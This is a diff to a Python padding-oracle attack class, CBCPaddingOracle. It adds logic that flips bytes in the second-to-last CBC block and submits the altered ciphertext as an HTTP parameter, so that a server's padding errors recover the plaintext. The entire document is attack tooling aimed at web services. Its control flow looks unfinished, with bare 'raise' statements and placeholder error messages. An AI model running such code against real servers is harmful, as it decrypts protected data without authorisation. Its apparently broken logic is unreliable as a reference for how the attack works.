@@ -44,6 +44,25 @@ class CBCPaddingOracle(HTTPLeaker):
 
         self.logger.info('we start with a message of %d bytes' % (len(self.ciphertext)))
 
+    def update_mask(self):
+        '''
+        This function is called when we have a known padding and we want to update it
+        to the next in order to start the guessing for the next byte.
+
+        It updates the "mask" of the state.
+        '''
+        padding = self.state['idx']
+        xored_new_padding = xor(chr(padding), chr(padding + 1))
+
+        block_start_offset = self.block_offset(self.blocks_number - 2)
+        block_end_offset = block_start_offset + self.state['block_length']
+
+        mask = self.state['mask']
+        self.state['mask'] = mask[:block_start_offset] + (xor(mask[block_start_offset:block_end_offset], xored_new_padding)) + mask[block_end_offset:]
+
+        '''we update the index of the byte we are looking for'''
+        self.state['padding'] += 1
+
     def update(self):
         state = self.state['state']
 
@@ -59,9 +78,12 @@ class CBCPaddingOracle(HTTPLeaker):
             elif padding_error:
                 self.logger.info('padding starts at offset %d' % (self.block_offset(self.blocks_number - 2) + self.state['idx']))
                 self.state['state'] = self.State.BYTE_RETRIEVAL
-                self.state['idx']   = self.state['block_length'] - self.state['idx'] # this index is from the tail of the string
-                self.state['mask']  = '\x00' * len(self.ciphertext) # we create a mask that will xor the original ciphertext
-                self.state['mask_byte'] = '\x01' # this is the first try
+
+                padding = self.state['block_length'] - self.state['idx']  # this index is from the tail of the string
+                self.state['idx']   = padding # idx will memorize the last value of padding correctly decoded
+
+                self.update_mask()
+
             elif success:
                 raise ValueError('this is bad my friend')
 
@@ -77,9 +99,10 @@ class CBCPaddingOracle(HTTPLeaker):
                     raise ValueError('You exceeded the allowed values')
 
                 self.state['mask_byte'] = chr(b)
-                raise
             elif file:
-                pass
+                self.logger.info('with %s it\'s ok' % self.state['mask_byte'])
+                self.update_mask()
+                raise
 
 
     def get_requests_method(self):
@@ -103,16 +126,17 @@ class CBCPaddingOracle(HTTPLeaker):
 
     def get_requests_params(self):
         ciphertext = self.state['original_ciphertext']
-        #ciphertext  = '865D1C0FB5BDB18B29F8CCA11B16FED0BDC02999AE07156FE2B6EC4274235529BD6C85A19359D78977F8B713DE9A47EF' # about us
 
         if self.state['state'] == self.State.ORIGINAL_PADDING_FINDING:
             # first of all we find the offset of the block before the last
-            #import ipdb;ipdb.set_trace()
             idx = (self.block_offset(self.blocks_number - 2) + self.state['idx'])
             ciphertext= ciphertext[:idx] + '0' + ciphertext[idx + 1:]
         elif self.state['state'] == self.State.BYTE_RETRIEVAL:
+            # here there is the real juice: we modify the original second-last
+            # block
             self.logger.info('probing %d-th byte' % self.state['idx'])
-            raise
+
+            ciphertext = xor(ciphertext, self.state['mask'])
 
         return {
             'c': hexify(ciphertext),
